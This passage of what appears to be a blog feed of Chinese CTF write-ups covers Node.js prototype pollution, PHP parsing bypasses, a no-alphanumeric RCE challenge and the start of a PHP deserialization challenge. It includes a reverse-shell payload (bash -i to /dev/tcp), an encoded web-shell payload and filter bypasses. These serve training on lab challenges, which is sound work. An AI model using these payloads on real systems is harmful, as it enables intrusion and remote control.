class="string">&#x27;base64&#x27;</span>)&#125;</span>`</span>;</span><br><span class="line">  <span class="title function_">exec</span>(cmd, <span class="function">(<span class="params">err,_,__</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">is_succ</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">is_succ</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8080</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`嗨嗨嗨！！老八来了！！！`</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//没敢吧所有变量名换成bababa 怕被打</span></span><br></pre></td></tr></table></figure><p>先看&#x2F;bkup路由</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">put</span>(<span class="string">&#x27;/bkup&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> date_stream = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(date)); </span><br><span class="line">  <span class="keyword">const</span> cmd = ba.<span class="property">redis_set</span> + <span class="string">`date <span class="subst">$&#123;date_stream.toString(<span class="string">&#x27;base64&#x27;</span>)&#125;</span>`</span>;</span><br><span class="line">  <span class="title function_">exec</span>(cmd, <span class="function">(<span class="params">err,_,__</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">is_succ</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">is_succ</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>发现了我们最喜欢的exec()函数</p><p> <code>const cmd = ba.redis_set + date $&#123;date_stream.toString(&#39;base64&#39;)&#125;;</code> </p><p>然后这部分ba.redis_set如果我们可控则能达到rce</p><p>再来看&#x2F;set路由</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/set&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  ba.<span class="title function_">bababa</span>(); </span><br><span class="line">  <span class="keyword">const</span> &#123;token, key, val&#125; = req.<span class="property">query</span>;</span><br><span class="line">  <span class="keyword">if</span> (!ba.<span class="title function_">baba</span>(token) || !val) <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;wrong&quot;</span>); </span><br><span class="line">  date[token][key] = val; </span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">is_succ</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>通过get方式给<code>token,key,var</code>传参</p><p><code>date[token][key] = val;</code>因为三个参数我们都可控，则可以进行原型链污染</p><p>这里解释一下为什么会是<code>data[token][key]</code>的形式，我们一般认为应该是<code>data.token.key</code>的形式</p><p>其实这两种形式是相等的都可以</p><p>比如ctfshow有题目的payload：</p><p>原本是：<code>?eval=require(&#39;child_process&#39;).execSync(&#39;ls&#39;)</code></p><p>如果改为<code>?eval=require(&#39;child_process&#39;)[&#39;execSync&#39;](&#39;ls&#39;)</code>那么都是可以的，两种都是等价的</p><p>回到原题，使得<code>token=__proto__,key=redis_set,var=shell</code></p><p>则ba.redis_se被污染</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?token=__proto__&amp;key=redis_set&amp;var=bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure><p>解释一下为什么要用 <code>bash -c</code> 由于我们是在外部运行shell指令，所以他默认是不会识别我们的<code>bash -i</code>反弹shell的，<code>bash -c</code>保证了命令使用<code>bash shell</code>去执行</p><p>反弹shell部分用url编码一下</p><p><code>bash -c</code>就是将后面字符串当作命令读入执行 然后输出  </p><h1 id="it’s-time"><a href="#it’s-time" class="headerlink" title="it’s time"></a>it’s time</h1><p>经典flask的ssti</p><p>直接当个脚本小子，大脚本注入</p><p>或者去找ctfshow 题目的payload都可以</p>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fast destruct </tag>
            
            <tag> nodejs 原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-68-[MRCTF2020]套娃</title>
      <link href="/post/b79f6776.html"/>
      <url>/post/b79f6776.html</url>
      
        <content type="html"><![CDATA[<p>[MRCTF2020]套娃</p><span id="more"></span><p>进入题目 查看源码</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">//<span class="number">1</span>st</span><br><span class="line">$query = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, &#x27;_&#x27;) !== <span class="number">0</span> || substr_count($query, &#x27;%<span class="number">5</span>f&#x27;) != <span class="number">0</span> )&#123;</span><br><span class="line">    die(&#x27;Y0u are So cutE!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;<span class="number">23333</span>&#x27; &amp;&amp; preg_match(&#x27;/^<span class="number">23333</span>$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123;</span><br><span class="line">    echo <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br></pre></td></tr></table></figure><p>分析：输入的字符串不能有<code>_</code>和其url编码，并且get传参b_u_p_t不能等于23333 但是正则匹配需要开头和结尾为23333</p><p>这里用到了php合法变量名的知识点，如果在传参时，遇到不合法的变量名比如<code>.</code>则php会自动将其转为<code>_</code></p><p>正则匹配preg_match()通过换行符<code>%0a</code>绕过即可  在非多行模式下，$似乎会忽略在句尾的%0a</p><p>可参考<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">https://www.cnblogs.com/20175211lyz/p/12198258.html</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362389224-9f93cdc0-b997-45e9-8f7f-626ec36b4db3.png" alt="img"></p><p>payload:<code>?b.u.p.t=23333%2a</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362539907-88b3cf13-c278-4b0f-8f7a-fc105d89bf4f.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/secrettw.php</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362573491-a422447e-dedc-437c-bfed-400642d8c01f.png" alt="img"></p><p>查看源码发现一段jsfuck编码 直接在console中输入就有回显了</p><p>关于jsfuck码可以参考：<a href="https://www.jianshu.com/p/e7246218f424">https://www.jianshu.com/p/e7246218f424</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362663557-fba897df-6aac-40fd-8941-3b7a8243c607.png" alt="img"></p><p>获得源码:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> &#x27;takeip.php&#x27;;</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;.&#x27;); </span><br><span class="line"><span class="keyword">include</span> &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_POST[&#x27;Merak&#x27;]))&#123; </span><br><span class="line">    highlight_file(__FILE__); </span><br><span class="line">    die(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> change($v)&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = &#x27;&#x27;; </span><br><span class="line">    for($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;Local access only!&#x27;.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=&#x27;<span class="number">127.0</span>.<span class="number">0.1</span>&#x27;)</span><br><span class="line">echo <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === &#x27;<span class="number">127.0</span>.<span class="number">0.1</span>&#x27; &amp;&amp; file_get_contents($_GET[&#x27;<span class="number">2333</span>&#x27;]) === &#x27;todat is a happy day&#x27; )&#123;</span><br><span class="line">echo <span class="string">&quot;Your REQUEST is:&quot;</span>.change($_GET[&#x27;<span class="keyword">file</span>&#x27;]);</span><br><span class="line">echo file_get_contents(change($_GET[&#x27;<span class="keyword">file</span>&#x27;])); &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ip用 <code>Client-ip: 127.0.0.1</code>写在请求头，并且只能用这个</p><p>到目前为止我也不知道 Client-ip xff Real-ip 这三个在不同题目下为什么不能互用的原因 有点阴间</p><p>2333用data伪协议去传参</p><p>我们要读的文件file会经过change函数改变 我们只需要倒着写一个change函数 让其进过题目函数时候回到我们想要的内容即可 脚本很简单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; &#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;ZmxhZy5waHA=&#x27;</span>;   <span class="comment">//Zm5lbTZ6dH4=</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">change</span>(<span class="variable">$str</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362979416-9100efcf-0951-4540-9a1b-a57509c7d87f.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php字符串解析特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-66-[极客大挑战 2019]RCE ME</title>
      <link href="/post/7f59ce0.html"/>
      <url>/post/7f59ce0.html</url>
      
        <content type="html"><![CDATA[<p>[极客大挑战 2019]RCE ME</p><span id="more"></span><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">            $code=$_GET[&#x27;code&#x27;];</span><br><span class="line">                    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        die(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,$code))&#123;</span><br><span class="line">                                        die(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ?&gt;</span><br></pre></td></tr></table></figure><p>这道题就是通过取反构造无数字字母rce的</p><p>其实这种构造奇淫rce的 明白原理之后 直接当个脚本小子做起题来嘎嘎快</p><p>生成脚本如下：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ans1=&#x27;assert&#x27;;//函数名</span><br><span class="line">$ans2=&#x27;eval($_POST[x])&#x27;;//命令</span><br><span class="line">$data1=(&#x27;~&#x27;.urlencode(~$ans1));//通过两次取反运算得到system</span><br><span class="line">$data2=(&#x27;~&#x27;.urlencode(~$ans2));//通过两次取反运算得到dir</span><br><span class="line">echo (&#x27;(&#x27;.$data1.&#x27;)&#x27;.&#x27;(&#x27;.$data2.&#x27;)&#x27;.&#x27;;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>直接构造<code>system(&#39;ls&#39;)</code>发现不可以</p><p>就很奇怪 构造<code>phpinfo()</code>找不到思路就去看看配置文件 这个真的很重要</p><p>payload:<code>?code=(~%8F%97%8F%96%91%99%90)();</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683357622168-d10c216a-c463-4f40-847a-88eecc81c4a3.png" alt="img"></p><p>发现原来是好多函数被禁了 难怪执行不了</p><p>构造<code>assert(eval($_POST[x]))</code>生成一句话木马用蚁剑去连接</p><p>注意这种eval()中再嵌套一个assert(eval())的方式 有时候可以绕过waf</p><p>payload: <code>?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%87%A2%D6);</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683358006276-a208a639-bd8a-4241-baa8-a5d4b64e4dcd.png" alt="img"></p><p>接下来的思路就是怎么绕过disble_function 具体方式可以看我这一篇文章 这里就不赘述了 <a href="https://z1d10t.github.io/post/db3afe26.html?highlight=disable">https://z1d10t.github.io/post/db3afe26.html?highlight=disable</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683358035645-929e3eb1-fe11-4d92-bed9-0bc5497f90d0.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE奇淫方式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-64-[0CTF 2016]piapiapia</title>
      <link href="/post/6e80c399.html"/>
      <url>/post/6e80c399.html</url>
      
        <content type="html"><![CDATA[<p>[0CTF 2016]piapiapia</p><span id="more"></span><p>一道php反序列化字符串逃逸的题目，需要代码审计，tql！</p><h2 id="捋清思路："><a href="#捋清思路：" class="headerlink" title="捋清思路："></a>捋清思路：</h2><p>首先注册一个账号，然后登录，发现有个文件上传地方，刚开始以为是传木马，然后去连，getshell但后面发现新大陆，一顿操作之后，发现需要扫网站，下载源码。</p><p>下载下来6个php文件 </p><p>在config.php中发现有flag 但是被删除了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683290000574-a5d69780-e1ec-48cc-a0f0-2351c7ced655.png" alt="img"></p><p>然后register.php与index.php都是一些基础的注册账号与登录账号的操作</p><p>然后由index.php转向update.php</p><p>也就是我们看到的这个界面</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683290165259-d39fb665-8660-42cc-9811-c6644e2aa4e0.png" alt="img"></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">//update.php</span><br><span class="line">&lt;?php</span><br><span class="line">require_once(&#x27;class.php&#x27;);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[&#x27;username&#x27;] == null) &#123;</span><br><span class="line">die(&#x27;Login First&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123;</span><br><span class="line"></span><br><span class="line">$username = $_SESSION[&#x27;username&#x27;];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(&#x27;/^\d&#123;<span class="number">11</span>&#125;$/&#x27;, $_POST[&#x27;phone&#x27;]))</span><br><span class="line">die(&#x27;Invalid phone&#x27;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(&#x27;/^[_a-zA-Z0-<span class="number">9</span>]&#123;<span class="number">1</span>,<span class="number">10</span>&#125;@[_a-zA-Z0-<span class="number">9</span>]&#123;<span class="number">1</span>,<span class="number">10</span>&#125;\.[_a-zA-Z0-<span class="number">9</span>]&#123;<span class="number">1</span>,<span class="number">10</span>&#125;$/&#x27;, $_POST[&#x27;email&#x27;]))</span><br><span class="line">die(&#x27;Invalid email&#x27;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(&#x27;/[^a-zA-Z0-<span class="number">9</span>_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; <span class="number">10</span>)</span><br><span class="line">die(&#x27;Invalid nickname&#x27;);</span><br><span class="line"></span><br><span class="line">$<span class="keyword">file</span> = $_FILES[&#x27;photo&#x27;];</span><br><span class="line"><span class="keyword">if</span>($<span class="keyword">file</span>[&#x27;size&#x27;] &lt; <span class="number">5</span> <span class="keyword">or</span> $<span class="keyword">file</span>[&#x27;size&#x27;] &gt; <span class="number">1000000</span>)</span><br><span class="line">die(&#x27;Photo size error&#x27;);</span><br><span class="line"></span><br><span class="line">move_uploaded_file($<span class="keyword">file</span>[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($<span class="keyword">file</span>[&#x27;name&#x27;]));</span><br><span class="line">$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];</span><br><span class="line">$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];</span><br><span class="line">$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];</span><br><span class="line">$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($<span class="keyword">file</span>[&#x27;name&#x27;]);</span><br><span class="line">  //user是class.php中的user的一个对象</span><br><span class="line">$user-&gt;update_profile($username, serialize($profile)); //我们的用户名admin和profile以序列化字符串形式传过去的</span><br><span class="line">echo &#x27;Update Profile Success!&lt;a href=<span class="string">&quot;profile.php&quot;</span>&gt;Your Profile&lt;/a&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>简单看一下就是通过post获取变量值，和一些简单的判断输入是否合法的语句，注意一下nickname(昵称)的判断</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(&#x27;/[^a-zA-Z0-<span class="number">9</span>_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; <span class="number">10</span>)</span><br><span class="line">die(&#x27;Invalid nickname&#x27;);</span><br></pre></td></tr></table></figure><p>nickname不能超过10个字符，之后会提及</p><p>然后传入update_profile() 这里<code>$profile</code>数组是我们通过序列化传入的，这里很重要</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user-&gt;update_profile($username, serialize($profile)); //我们的用户名admin和profile以序列化字符串形式传过去的</span><br></pre></td></tr></table></figure><p>之后传入class.php</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">//class.php</span><br><span class="line">&lt;?php</span><br><span class="line">require(&#x27;config.php&#x27;);</span><br><span class="line"></span><br><span class="line">class user extends mysql&#123;   //继承类的生成 mysql为父类 user为子类</span><br><span class="line">private $table = &#x27;users&#x27;;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">function</span> is_exists($username) &#123;</span><br><span class="line">$username = parent::filter($username);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">&quot;username = &#x27;$username&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> parent::select($this-&gt;table, $where);</span><br><span class="line">&#125;</span><br><span class="line">public <span class="keyword">function</span> register($username, $password) &#123;</span><br><span class="line">$username = parent::filter($username);</span><br><span class="line">$password = parent::filter($password);</span><br><span class="line"></span><br><span class="line">$key_list = Array(&#x27;username&#x27;, &#x27;password&#x27;);</span><br><span class="line">$value_list = Array($username, md5($password));</span><br><span class="line"><span class="keyword">return</span> parent::insert($this-&gt;table, $key_list, $value_list);</span><br><span class="line">&#125;</span><br><span class="line">public <span class="keyword">function</span> login($username, $password) &#123;</span><br><span class="line">$username = parent::filter($username);</span><br><span class="line">$password = parent::filter($password);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">&quot;username = &#x27;$username&#x27;&quot;</span>;</span><br><span class="line">$object = parent::select($this-&gt;table, $where);</span><br><span class="line"><span class="keyword">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">public <span class="keyword">function</span> show_profile($username) &#123;</span><br><span class="line">$username = parent::filter($username);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">&quot;username = &#x27;$username&#x27;&quot;</span>;</span><br><span class="line">$object = parent::select($this-&gt;table, $where);</span><br><span class="line"><span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">&#125;</span><br><span class="line">public <span class="keyword">function</span> update_profile($username, $new_profile) &#123;</span><br><span class="line">$username = parent::filter($username);</span><br><span class="line">$new_profile = parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">&quot;username = &#x27;$username&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where);</span><br><span class="line">&#125;</span><br><span class="line">public <span class="keyword">function</span> __tostring() &#123;</span><br><span class="line"><span class="keyword">return</span> __class__;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class mysql &#123;</span><br><span class="line">private $link = null;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">function</span> connect($config) &#123;</span><br><span class="line">$this-&gt;link = mysql_connect(</span><br><span class="line">$config[&#x27;hostname&#x27;],</span><br><span class="line">$config[&#x27;username&#x27;], </span><br><span class="line">$config[&#x27;password&#x27;]</span><br><span class="line">);</span><br><span class="line">mysql_select_db($config[&#x27;database&#x27;]);</span><br><span class="line">mysql_query(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $this-&gt;link;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">function</span> select($table, $where, $ret = &#x27;*&#x27;) &#123;</span><br><span class="line">$sql = <span class="string">&quot;SELECT $ret FROM $table WHERE $where&quot;</span>;</span><br><span class="line">$result = mysql_query($sql, $this-&gt;link);</span><br><span class="line"><span class="keyword">return</span> mysql_fetch_object($result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">function</span> insert($table, $key_list, $value_list) &#123;</span><br><span class="line">$key = implode(&#x27;,&#x27;, $key_list);</span><br><span class="line">$value = &#x27;\&#x27;&#x27; . implode(&#x27;\&#x27;,\&#x27;&#x27;, $value_list) . &#x27;\&#x27;&#x27;; 